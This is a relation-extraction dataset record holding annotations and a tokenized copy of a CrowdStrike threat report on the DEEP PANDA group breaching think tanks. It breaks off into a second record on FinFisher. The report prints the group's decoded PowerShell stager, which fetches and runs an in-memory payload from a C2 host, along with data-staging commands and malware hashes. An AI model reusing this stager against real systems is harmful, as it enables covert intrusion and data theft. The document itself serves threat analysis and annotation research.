"type": "Organization", "name": "CrowdStrike", "sent_id": 35, "pos": [0]}, {"old_id": "T3", "type": "Software", "name": "Falcon Host", "sent_id": 35, "pos": [4, 5]}, {"old_id": "T4", "type": "Software", "name": "Falcon Host", "sent_id": 41, "pos": [2, 3]}, {"old_id": "T5", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 43, "pos": [3, 4]}, {"old_id": "T6", "type": "Organization", "name": "CrowdStrike", "sent_id": 45, "pos": [0]}, {"old_id": "T7", "type": "Address", "name": "DEEP PANDA", "sent_id": 45, "pos": [3, 4]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "government defense financial legal and the telecommunications industries", "sent_id": 46, "pos": []}, {"old_id": "T9", "type": "Software", "name": "Falcon Host", "sent_id": 48, "pos": [3, 4]}, {"old_id": "T10", "type": "Software", "name": "Falcon Host", "sent_id": 51, "pos": [4, 5]}, {"old_id": "T11", "type": "Information", "name": "Southeast Asia policy information", "sent_id": 55, "pos": [0, 3]}, {"old_id": "T12", "type": "Software", "name": "Falcon Host", "sent_id": 73, "pos": [1, 2]}, {"old_id": "T13", "type": "Exploit", "name": "powershell scripts", "sent_id": 84, "pos": [0, 1]}, {"old_id": "T14", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 90, "pos": [0, 1]}, {"old_id": "T15", "type": "Obfuscation", "name": "base64", "sent_id": 91, "pos": [7]}, {"old_id": "T16", "type": "Payload", "name": "Wafer", "sent_id": 155, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "MadHatter NET", "sent_id": 160, "pos": [3, 6]}, {"old_id": "T18", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 161, "pos": [5, 6]}, {"old_id": "T19", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 163, "pos": [10, 11]}, {"old_id": "T20", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 167, "pos": [5, 6]}, {"old_id": "T21", "type": "Exploit", "name": "powershell scripts", "sent_id": 173, "pos": [0, 1]}, {"old_id": "T22", "type": "Exploit", "name": "Cult of the Dead Cow\u2019s NetE", "sent_id": 175, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "cftmonexe", "sent_id": 201, "pos": []}, {"old_id": "T24", "type": "Password", "name": "uinfw", "sent_id": 203, "pos": []}, {"old_id": "T25", "type": "Exploit", "name": "WMI", "sent_id": 206, "pos": [6]}, {"old_id": "T26", "type": "Attacker", "name": "DEEP PANDA", "sent_id": 221, "pos": [0, 1]}, {"old_id": "T27", "type": "ExploitTargetObject", "name": "multinational financial institutions", "sent_id": 222, "pos": [4, 6]}, {"old_id": "T28", "type": "ExploitTargetObject", "name": "law firms", "sent_id": 222, "pos": [8, 9]}, {"old_id": "T29", "type": "ExploitTargetObject", "name": "defense contractors", "sent_id": 223, "pos": [0, 1]}, {"old_id": "T30", "type": "ExploitTargetObject", "name": "government agencies", "sent_id": 223, "pos": [4, 5]}, {"old_id": "T31", "type": "Software", "name": "Falcon Host", "sent_id": 227, "pos": [2, 3]}, {"old_id": "T32", "type": "Software", "name": "Falcon Host", "sent_id": 227, "pos": [2, 3]}], "labels": [{"old_id": "R1", "r": "P17", "h": 1, "t": 2, "evidence": [35]}, {"old_id": "R2", "r": "P2", "h": 13, "t": 12, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 12, "t": 14, "evidence": [84, 85, 86, 87, 88, 89, 90, 91]}, {"old_id": "R4", "r": "P2", "h": 17, "t": 16, "evidence": []}, {"old_id": "R5", "r": "P2", "h": 19, "t": 20, "evidence": [167, 168, 169, 170, 171, 172, 173]}], "title": ["inputs/txt/201407CrowdStrikeDeepPanda"], "sents": [["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Deep", "in", "Thought:", "Chinese"], ["Targeting", "of", "National", "Security"], ["Think", "Tanks"], ["July", "7", ",", "2014"], ["Dmitri", "Alperovitch"], ["Executive", "Viewpoint"], ["For", "some", "time", "now", ",", "CrowdStrike", "has", "been", "working", "with", "a"], ["number", "of", "national", "security", "think", "tanks", "and", "human", "rights"], ["organizations", "on", "a", "pro", "bono", "basis", "to", "help", "them", "with", "their"], ["security", "posture", ".", "These", "organizations", "face", "some", "of", "the", "most"], ["advanced", "nation-state", "adversaries", "\u2014", "China", ",", "Russia", ",", "and", "Iran", ","], ["just", "to", "name", "a", "few", ".", "The", "individuals", "who", "are", "typically", "targeted", "at"], ["these", "institutions", "tend", "to", "be", "former", "senior", "government", "officials"], ["who", "still", "have", "lots", "of", "contacts", "within", "Western", "governments", "and", ","], ["as", "such", ",", "their", "private", "correspondence", "is", "of", "extreme", "interest", "to"], ["these", "attackers", ".", "The", "intelligence", "services", "of", "these", "nation", "states"], ["are", "always", "on", "the", "lookout", "for", "any", "clues", "they", "may", "extract", "from"], ["such", "private", "communications", "that", "may", "give", "them", "an", "advanced"], ["insight", "into", "what", "options", "government", "policy", "makers", "are"], ["considering", "on", "particular", "issues", "of", "interest", ".", "At", "the", "same", "time", ","], ["with", "access", "to", "the", "victim", "email", "mailboxes", ",", "the", "adversaries", "can"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["1/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["craft", "very", "realistic", "spear-phishing", "lures", "to", "the", "government"], ["contacts", "of", "targeted", "think", "tank", "personnel", "by", "piggybacking", "on"], ["ongoing", "real", "conversations", "and", "increasing", "their", "chances", "of", "a"], ["successful", "compromise", "of", "an", "official", "government", "email", "account", "."], ["Despite", "this", "high", "threat", "level", ",", "these", "think", "tanks", "are", "organized", "as"], ["non-profits", "and", "often", "do", "not", "have", "the", "budgets", "of", "commercial"], ["organizations", "to", "afford", "cutting-edge", "security", "technologies", "that"], ["can", "help", "them", "effectively", "detect", "these", "threats", ".", "For", "this", "reason", ","], ["CrowdStrike", "has", "provided", "our", "Falcon", "Host", "endpoint", "security"], ["technology", "to", "many", "of", "these", "organizations", "at", "no", "charge", "to", "them"], ["to", "help", "detect", "and", "attribute", "these", "attackers", "on", "their", "networks", "in"], ["real", "time", ",", "as", "well", "as", "to", "receive", "instantaneous", "full", "forensic"], ["visibility", "into", "their", "behavior", "to", "help", "with", "full", "remediation", "of", "any"], ["incident", "."], ["Recently", ",", "Falcon", "Host", "has", "detected", "multiple", "simultaneous"], ["compromises", "at", "several", "national", "security", "think", "tanks", "from", "an"], ["actor", "we", "call", "DEEP", "PANDA", ",", "one", "of", "the", "most", "advanced", "Chinese"], ["nation-state", "cyber", "intrusion", "groups", ".", "For", "almost", "three", "years", "now", ","], ["CrowdStrike", "has", "monitored", "DEEP", "PANDA", "targeting", "critical", "and"], ["strategic", "business", "verticals", "including:", "government", ",", "defense", ","], ["financial", ",", "legal", ",", "and", "the", "telecommunications", "industries", ".", "At", "the"], ["think", "tanks", ",", "Falcon", "Host", "detected", "targeting", "of", "senior", "individuals"], ["involved", "in", "geopolitical", "policy", "issues", ",", "in", "particular", "in", "the"], ["China/Asia", "Pacific", "region", ".", "However", ",", "last", "week", "the", "unprecedented"], ["real-time", "visibility", "provided", "by", "Falcon", "Host", "into", "this", "actor\u2019s"], ["escapades", "allowed", "analysts", "to", "observe", "a", "radical", "change", "in"], ["targeting", "."], ["This", "actor", ",", "who", "was", "engaged", "in", "targeting", "and", "collection", "of"], ["Southeast", "Asia", "policy", "information", ",", "suddenly", "began", "targeting"], ["individuals", "with", "a", "tie", "to", "Iraq/Middle", "East", "issues", ".", "This", "is"], ["undoubtedly", "related", "to", "the", "recent", "Islamic", "State", "of", "Iraq", "and", "the"], ["Levant", "(ISIS)", "takeover", "of", "major", "parts", "of", "Iraq", "and", "the", "potential"], ["disruption", "for", "major", "Chinese", "oil", "interests", "in", "that", "country", ".", "In", "fact", ","], ["Iraq", "happens", "to", "be", "the", "fifth-largest", "source", "of", "crude", "oil", "imports"], ["for", "China", "and", "the", "country", "is", "the", "largest", "foreign", "investor", "in", "Iraq\u2019s"], ["oil", "sector", ".", "Thus", ",", "it", "wouldn\u2019t", "be", "surprising", "if", "the", "Chinese"], ["government", "is", "highly", "interested", "in", "getting", "a", "better", "sense", "of", "the"], ["possibility", "of", "deeper", "U", ".", "S.", "military", "involvement", "that", "could", "help"], ["protect", "the", "Chinese", "oil", "infrastructure", "in", "Iraq", ".", "In", "fact", ",", "the", "shift", "in"], ["targeting", "of", "Iraq", "policy", "individuals", "occurred", "on", "June", "18", ",", "the", "day"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["2/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["that", "ISIS", "began", "its", "attack", "on", "the", "Baiji", "oil", "refinery", "."], ["The", "Attacks"], ["CrowdStrike\u2019s", "Falcon", "Host", "technology", "used", "by", "these", "think", "tanks"], ["consists", "of", "a", "tiny", "(under", "5mb", "in", "size)", "kernel", "sensor", "that", "is"], ["deployed", "on", "Windows", "and", "Mac", "servers", ",", "desktops", ",", "and", "laptops"], ["and", "is", "able", "to", "do", "real-time", "detection", "and", "recording", "of", "all"], ["adversary", "activities", "taking", "place", "on", "the", "system", ".", "In", "addition", ",", "by"], ["matching", "the", "detected", "activities", "against", "our", "vast", "Adversary"], ["Intelligence", "repository", ",", "Falcon", "Host", "can", "automatically", "attribute"], ["the", "attack", "to", "a", "known", "adversary", "group", "and", "provide", "details", "about"], ["their", "motivations", ",", "capabilities", ",", "and", "key", "Tactics", ",", "Techniques", ",", "and"], ["Procedures", "(TTPs)", "."], ["Recently", ",", "we", "detected", "breaches", "of", "these", "networks", "via", "the", "use", "of"], ["powershell", "scripts", "deployed", "by", "the", "adversary", "as", "scheduled", "tasks"], ["on", "Windows", "machines", ".", "The", "scripts", "are", "passed", "to", "the", "powershell"], ["interpreter", "through", "the", "command", "line", "to", "avoid", "placement", "of"], ["extraneous", "files", "on", "the", "victim", "machine", "that", "could", "potentially"], ["trigger", "AV-", "or", "Indicator", "of", "Compromise", "(IOC)-based", "detection", "."], ["The", "scripts", "were", "scheduled", "to", "call", "back", "every", "two", "hours", "to", "the"], ["DEEP", "PANDA", "Command", "and", "Control", "(C2)", "infrastructure", "."], ["The", "script", "in", "the", "command", "line", "is", "base64", "encoded", ",", "but", "when"], ["decoded", "it", "translates", "to", "the", "following", "code", "snippet:"], ["[System", ".", "Net.ServicePointManager]::ServerCertificateValidationCallback"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["3/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["=", "{$true}"], ["$wc", "=", "New\u00adObject", "\u00adTypeName", "System", ".", "Net.WebClient"], ["$wc", ".", "Headers.Add(\u201cAccept\u00adLanguage\u201d,", "\u201cen\u00ad"], ["US,en\u037eq=0", ".", "\u201d", "+", "([IntPtr]::Size", "\u2013", "1)", ".", "ToString())"], ["$wc", ".", "Headers.Add(\u201cUser\u00adAgent\u201d,", "\u201cMozilla/5", ".", "0"], ["(compatible\u037e", "MSIE", "10", ".", "0\u037e", "Windows", "NT", "6", ".", "1\u037e", "WOW64\u037e"], ["Trident/6", ".", "0)\u201d)"], ["$rndn", "=", "Get\u00adRandom"], ["$wc", ".", "Headers.Add(\u201cCookie\u201d,", "\u201cp=\u201d", "+", "$rndn)"], ["$data", "="], ["$wc", ".", "DownloadData(\u201chttps://<ANONYMIZED>/config/oauth/\u201d)"], ["[string[]]$xags", "="], ["\u201chttps://<ANONYMIZED>/config/login/\u201d", ","], ["\u201cWMITool", ".", "Program\u201d,", "\u201cMain\u201d", ",", "\u201c/f\u201d", ",", "\u201cssh\u201d", ",", "\u201c/s\u201d", ","], ["\u201c<ANONYMIZED>\u201d", ",", "\u201c/p\u201d", ",", "\u201c443\u201d"], ["$Passphrase", "=", "\u201c<ANONYMIZED>\u201d"], ["$salts", "=", "\u201c<ANONYMIZED>\u201d"], ["$r", "=", "new\u00adObject"], ["System", ".", "Security.Cryptography.RijndaelManaged"], ["$pass", "="], ["[System", ".", "Text.Encoding]::UTF8.GetBytes($Passphrase)"], ["$salt", "="], ["[System", ".", "Text.Encoding]::UTF8.GetBytes($salts)"], ["$r", ".", "Key", "=", "(new\u00adObject"], ["Security", ".", "Cryptography.PasswordDeriveBytes", "$pass", ","], ["$salt", ",", "\u201cSHA1\u201d", ",", "5)", ".", "GetBytes(32)", "#256/8"], ["$r", ".", "IV", "=", "(new\u00adObject"], ["Security", ".", "Cryptography.SHA1Managed).ComputeHash("], ["[Text", ".", "Encoding]::UTF8.GetBytes($rndn)", ")[0", ".", ".15]"], ["$d", "=", "$r", ".", "CreateDecryptor()"], ["$ms", "=", "new\u00adObject", "IO", ".", "MemoryStream", "@(", ",", "$data)"], ["$cs", "=", "new\u00adObject"], ["Security", ".", "Cryptography.CryptoStream", "$ms", ",", "$d,\u201dRead\u201d"], ["$dfs", "=", "New\u00adObject"], ["System", ".", "IO.Compression.GzipStream", "$cs", ","], ["([IO", ".", "Compression.CompressionMode]::Decompress)"], ["$msout", "=", "New\u00adObject", "System", ".", "IO.MemoryStream"], ["[byte[]]$buffer", "=", "new\u00adobject", "byte[]", "4096"], ["[int]$count", "=", "0"], ["do"], ["{"], ["$count", "=", "$dfs", ".", "Read($buffer,", "0", ",", "$buffer", ".", "Length)"], ["$msout", ".", "Write($buffer,", "0", ",", "$count)"], ["}", "while", "($count", "\u00adgt", "0)"], ["$dfs", ".", "Close()"], ["$cs", ".", "Close()"], ["$ms", ".", "Close()"], ["$r", ".", "Clear()"], ["[byte[]]$bin", "=", "$msout", ".", "ToArray()"], ["$al", "=", "New\u00adObject", "\u00adTypeName"], ["System", ".", "Collections.ArrayList"], ["$al", ".", "Add($xags)"], ["$asm", "=", "[System", ".", "Reflection.Assembly]::Load($bin)"], ["$asm", ".", "EntryPoint.Invoke($null,", "$al", ".", "ToArray())"], ["sleep", "5"], ["Exit"], ["Once", "executed", ",", "it", "downloads", "and", "executes", "from", "memory", "a", "", ".", "NET"], ["executable", "(typically", "named", "Wafer)", ",", "which", "in", "turn", "typically"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["4/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["downloads", "and", "runs", "MadHatter", "", ".", "NET", "Remote", "Access", "Tool", "(RAT)", ","], ["one", "of", "the", "favorites", "of", "DEEP", "PANDA", ".", "By", "running", "them", "from"], ["memory", ",", "it", "leaves", "no", "disk", "artifacts", "or", "host-based", "IOCs", "that", "can"], ["be", "identified", "in", "forensic", "analysis", ".", "This", "is", "typical", "for", "DEEP", "PANDA"], ["\u2014", "stealth", "is", "their", "specialty", "and", "they", "prefer", "to", "operate", "in", "a", "way"], ["that", "leaves", "a", "minimal", "footprint", "on", "a", "victim", "system", "and", "often"], ["allows", "them", "to", "evade", "detection", "for", "a", "very", "long", "time", "."], ["For", "this", "same", "reason", ",", "DEEP", "PANDA", "likes", "to", "use", "webshells", "to", "keep"], ["low-footprint", "persistent", "access", "to", "the", "victim", "network", ",", "as", "we\u2019ve"], ["covered", "in", "our", "prior", "blogs", ".", "This", "case", "was", "no", "exception", ",", "and", "that"], ["initial", "webshell", "implant", "allowed", "them", "to", "execute", "reconnaissance"], ["commands", "such", "as", "\u201ctasklist", ",", "\u201d", "\u201cnet", "view", ",", "\u201d", "and", "\u201cnet"], ["localgroup", "administrators", ",", "\u201d", "and", "then", "afterward", "to", "deploy", "the"], ["powershell", "scripts", "."], ["The", "adversary", "used", "stolen", "credentials", "to", "mount", "network", "shares"], ["via", "\u201cnet", "use\u201d", "command", ".", "In", "one", "case", ",", "they", "brought", "in", "Cult", "of"], ["the", "Dead", "Cow\u2019s", "NetE", "tool", "onto", "the", "system", ",", "but", "most", "of", "the", "time"], ["they", "leveraged", "existing", "Windows", "tools", "and", "avoided", "bringing"], ["many", "new", "tools", "into", "the", "environment", "that", "could", "make", "them"], ["noisy", "and", "easily", "detectable", "by", "technologies", "that", "scan", "for", "static"], ["IOCs", "."], ["After", "using", "compromised", "credentials", "to", "mount", "file", "shares", ",", "the"], ["adversary", "was", "seen", "compressing", "data", "using", "7-zip", ".", "They", "were"], ["adding", "different", "document", "types", "to", "compressed", "files", "by"], ["wildcarding", "the", "extensions", ",", "such", "as:"], ["\u201cC:Program", "Files7\u00adZip7z\u201d", "a", "setup1", ".", "log", "\u00adr", "\u00adpkkk***"], ["\u201c\\<share", "name>users<UserName>*rtf", "*doc\u201d"], ["\u201cC:Program", "Files7\u00adZip7z\u201d", "a", "setup1", ".", "log", "\u00adr", "\u00adpkkk***"], ["\u201c\\<share", "name>users<UserName>*ppt\u201d"], ["They", "knew", "exactly", "which", "users", "to", "target", "based", "on", "their", "research"], ["policy", "area", ",", "and", "they", "rapidly", "pivoted", "from", "China/Asia", "Pacific"], ["policy", "experts", "to", "Iraq/Middle", "East", "policy", "experts", "once", "their"], ["tasking", "collection", "requirements", "changed", "."], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["5/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Aggressive", "Use", "of", "Ping", "to", "Determine", "Which", "Machines", "of", "Interest"], ["are", "Online"], ["On", "one", "of", "the", "compromised", "machines", ",", "the", "adversary", "brought", "in"], ["a", "command-line", "version", "of", "RAR", "archiver", "that", "was", "named"], ["\u201ccftmon", ".", "exe\u201d", "and", "placed", "it", "into", "\u201cc:windowstemphotfix\u201d"], ["directory", ".", "The", "files", "were", "encrypted", "(both", "file", "data", "and", "headers)"], ["with", "\u201cuinfw\u201d", "password", "and", "the", "archive", "files", "were", "named", "after"], ["the", "initials", "of", "each", "user", "that", "had", "been", "targeted", "and", "stored", "in", "the"], ["same", "\u201cc:windowstemphotfix\u201d", "directory", "."], ["For", "lateral", "movement", ",", "they", "used", "WMI", "to", "deploy", "the", "powershell"], ["scripts", "remotely", "and", "setup", "scheduled", "tasks", "on", "the", "remote"], ["systems", "."], ["\ue600"], ["BLOG"], ["Despite", "the", "fact", "that", "we", "were", "seeing", "nearly", "identical", "TTPs", "used"], ["across", "multiple", "think-tank", "targets", ",", "there", "is", "evidence", "to", "indicate"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["6/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["that", "these", "operations", "had", "different", "individuals", "behind", "the"], ["keyboard", "based", "on", "the", "intricacies", "of", "how", "certain", "powershell"], ["command", "lines", "had", "been", "used", "in", "each", "case", "."], ["Summary"], ["DEEP", "PANDA", "presents", "a", "very", "serious", "threat", "not", "just", "to", "think"], ["tanks", ",", "but", "also", "multinational", "financial", "institutions", ",", "law", "firms", ","], ["defense", "contractors", ",", "and", "government", "agencies", ".", "Due", "to", "their"], ["stellar", "operational", "security", "and", "reliance", "on", "anti-forensic", "and"], ["anti-IOC", "detection", "techniques", ",", "detecting", "and", "stopping", "them", "is"], ["very", "challenging", "without", "the", "use", "of", "next-generation", "endpoint"], ["technology", "like", "Falcon", "Host", ".", "Not", "only", "was", "Falcon", "Host", "able", "to"], ["detect", "this", "adversary", "without", "relying", "on", "static", "signatures", "or"], ["IOCs", ",", "but", "it", "was", "able", "to", "provide", "instantaneous", "and", "full", "forensic"], ["analysis", "of", "what", "had", "occurred", "on", "each", "of", "the", "compromised"], ["endpoints", "without", "the", "need", "to", "pull", "hard", "drives", "and", "do", "costly", "and"], ["time-intensive", "forensics", ",", "substantially", "reducing", "the", "time", "needed"], ["for", "remediation", "."], ["If", "you", "are", "a", "non-profit", "think", "tank", "or", "a", "human", "rights", "organization"], ["that", "would", "like", "to", "take", "advantage", "of", "our", "no-charge", "offer", "of", "Falcon"], ["Host", "licenses", "for", "your", "servers", "and", "desktops", ",", "please", "email", "us", "at"], ["sales@crowdstrike", ".", "com", "with", "the", "subject", "\u201cNon-Profit", "Falcon"], ["Host", "Offer", ".", "\u201d"], ["Our", "Falcon", "Intelligence", "subscribers", "have", "had", "access", "to", "multiple"], ["reports", "on", "the", "DEEP", "PANDA", "actor", "that", "includes", "full", "analysis", "of"], ["their", "attribution", ",", "tradecraft", "and", "TTPs", ",", "as", "well", "as", "detection"], ["\uf077"], ["indicators", "and", "signatures", "and", "remediation", "instructions", ".", "And", "our"], ["CrowdStrike", "Services", "has", "worked", "on", "multiple", "intrusion"], ["investigations", "related", "to", "DEEP", "PANDA", "in", "the", "last", "year", ".", "If", "you"], ["would", "also", "like", "to", "see", "a", "demo", "of", "Falcon", "Host", "or", "Falcon"], ["Intelligence", "in", "action", "or", "discuss", "our", "Services", "offerings", ",", "please"], ["contact", "our", "Sales", "Team", "to", "schedule", "a", "personal", "briefing", "."], ["Stay", "safe", "and", "keep", "a", "watchful", "eye", "on", "the", "Pandas", ",", "Bears", ",", "Kittens", ","], ["and", "other", "adversaries", "who", "are", "relentlessly", "preying", "on", "your", "data", "!"], ["\uf099", "Tweet"], ["\uf0e1", "Share"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["7/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Dmitri", "Alperovitch"], ["Co-founder", "and", "CTO", "of", "Crowdstrike", ",", "Dmitri", "Alperovitch"], ["leads", "the", "Intelligence", ",", "Technology", "and", "CrowdStrike", "Labs"], ["teams", ".", "Alperovitch", "has", "invented", "18", "patented"], ["technologies", "and", "has", "conducted", "extensive", "research", "on"], ["reputation", "systems", ",", "spam", "detection", ",", "web", "security", ","], ["public-key", "and", "identity-based", "cryptography", ",", "malware"], ["and", "intrusion", "detection/prevention", ".", "He", "is", "a", "renowned"], ["computer", "security", "researcher", "and", "thought", "leader", "on"], ["cybersecurity", "policies", "and", "state", "tradecraft", "."], ["Alperovitch\u2019s", "many", "honors", "include", "being", "selected", "as"], ["MIT", "Technology", "Review\u2019s", "\u201cYoung", "Innovators", "under"], ["35\u201d", "(TR35)", "in", "2013", ".", "He", "also", "was", "named", "Foreign", "Policy"], ["Magazine\u2019s", "Leading", "Global", "Thinker", "for", "2013", "and"], ["received", "a", "Federal", "100", "Award", "for", "his", "information"], ["security", "contributions", "."], ["Related", "Content"], ["U", ".", "S.", "\u2013", "China"], ["Agreement", "on"], ["Cyber"], ["Intrusions:", "An"], ["Inflection"], ["Point"], ["Are", "You", "More"], ["Interested", "in"], ["Stopping", "a"], ["Breach", "or"], ["Stopping"], ["Malware", "?"], ["VENOM"], ["Vulnerability:"], ["Community"], ["Patching", "and"], ["Mitigation"], ["Update"], ["Chinese"], ["This", "is", "a"], ["Today", ","], ["economic"], ["question", "I", "ask", "a"], ["CrowdStrike"], ["espionage"], ["lot", "of"], ["disclosed", "a"], ["reached", "its"], ["organizations"], ["critical", "virtual"], ["boiling", "point"], ["that", "I", "speak", "with", "."], ["machine", "escape"], ["some", "time", "ago", ","], ["While", "the\u2026"], ["vulnerability"], ["and", "has", "been"], ["(which", "we", "named"], ["scalding"], ["VENOM)"], ["industries"], ["discovered", "by"], ["throughout\u2026"], ["our\u2026"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["8/9"], ["2016/5/2"], ["Deep", "in", "Thought:", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["\ue603"], ["Copyright", "\u00a9", "2016", "CrowdStrike", "|"], ["Privacy", "|"], ["\uf099"], ["Request", "Info", "|"], ["http://www", ".", "crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"], ["Blog", "|"], ["Contact", "Us", "|"], ["\uf0e1"], ["\uf09a"], ["\uf16a"], ["1", ".", "888.512.8906"], ["9/9"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "The Citizen Lab", "sent_id": 2, "pos": [0, 2]}, {"old_id": "T3", "type": "Organization", "name": "Gamma International UK Ltd", "sent_id": 7, "pos": [9, 12]}, {"old_id": "T2", "type": "Software", "name": "FinFisher Suite", "sent_id": 7, "pos": [1, 2]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "Bahraini pro-democracy activists", "sent_id": 14, "pos": [3, 5]}, {"old_id": "T5", "type": "Time", "name": "April", "sent_id": 14, "pos": [7]}, {"old_id": "T6", "type": "Time", "name": "May", "sent_id": 14, "pos": [9]}, {"old_id": "T7", "type": "Person", "name": "Vernon Silver", "sent_id": 13, "pos": [11, 12]}, {"old_id": "T8", "type": "Organization", "name": "Bloomberg News", "sent_id": 13, "pos": [14, 15]}, {"old_id": "T9", "type": "Malware", "name": "Finspy", "sent_id": 20, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "Bahraini activists", "sent_id": 26, "pos": [8, 9]}, {"old_id": "T11", "type": "Country", "name": "Bahrain", "sent_id": 27, "pos": [8]}, {"old_id": "T12", "type": "ThreatActor", "name": "Melissa Chan", "sent_id": 31, "pos": []}, {"old_id": "T13", "type": "Organization", "name": "Aljazeera English", "sent_id": 31, "pos": [10, 11]}, {"old_id": "T14", "type": "Malware", "name": "324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc rar\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a", "sent_id": 33, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914 _gpjArrestedXSuspectsrar", "sent_id": 34, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7 KingXhamadXonXofficialXvisitXtoXrar", "sent_id": 35, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc MeetingXAgendarar", "sent_id": 37, "pos": []}, {"old_id": "T18", "type": "Malware", "name": "f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751 Rajabrar", "sent_id": 38, "pos": []}, {"old_id": "T19", "type": "Malware", "name": "49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040 dialogeexe", "sent_id": 40, "pos": []}, {"old_id": "T20", "type": "Malware", "name": "cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c exeRajab1jpg", "sent_id": 41, "pos": []}, {"old_id": "T21", "type": "Malware", "name": "39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba exeimage1jpg", "sent_id": 42, "pos": []}, {"old_id": "T22", "type": "Malware", "name": "e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632 exeRajabjpg", "sent_id": 43, "pos": []}, {"old_id": "T23", "type": "Malware", "name": "2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14 exeArrested Suspectsjpg", "sent_id": 44, "pos": []}, {"old_id": "T24", "type": "Malware", "name": "c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864 News about the existence of a new dialogue between AlWefaq & Govtdoc", "sent_id": 45, "pos": []}, {"old_id": "T25", "type": "Time", "name": "July 2012", "sent_id": 48, "pos": [0, 1]}, {"old_id": "T26", "type": "Obfuscation", "name": "righttoleftoverride", "sent_id": 51, "pos": []}, {"old_id": "T27", "type": "Obfuscation", "name": "RLO", "sent_id": 51, "pos": [8]}, {"old_id": "T28", "type": "Malware", "name": "Arrested Suspectsjpg", "sent_id": 62, "pos": []}, {"old_id": "T29", "type": "Malware", "name": "gpjstcepsuS detserrAexe", "sent_id": 63, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "C:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF", "sent_id": 67, "pos": [0, 3]}, {"old_id": "T31", "type": "TrojanHorse", "name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\deletebat", "sent_id": 72, "pos": []}, {"old_id": "T32", "type": "TrojanHorse", "name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverwsys", "sent_id": 73, "pos": []}, {"old_id": "T33", "type": "Indicator", "name": "C:\\Documents and Settings\\%USER%\\Application Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}", "sent_id": 75, "pos": [0, 3]}, {"old_id": "T34", "type": "TrojanHorse", "name": "driverwsys", "sent_id": 77, "pos": []}, {"old_id": "T35", "type": "TrojanHorse", "name": "deletebat", "sent_id": 77, "pos": []}, {"old_id": "T36", "type": "Time", "name": "July 2012", "sent_id": 81, "pos": [0, 1]}, {"old_id": "T37", "type": "MalwareCharacteristics", "name": "process hollowing", "sent_id": 83, "pos": []}, {"old_id": "T38", "type": "Malware", "name": "winlogonexe", "sent_id": 84, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "y:\\lsvn_branches\\finspyv401\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv erpdb", "sent_id": 101, "pos": []}, {"old_id": "T40", "type": "Malware", "name": "FinSpy", "sent_id": 105, "pos": [15]}, {"old_id": "T41", "type": "Obfuscation", "name": "virtualised packer", "sent_id": 112, 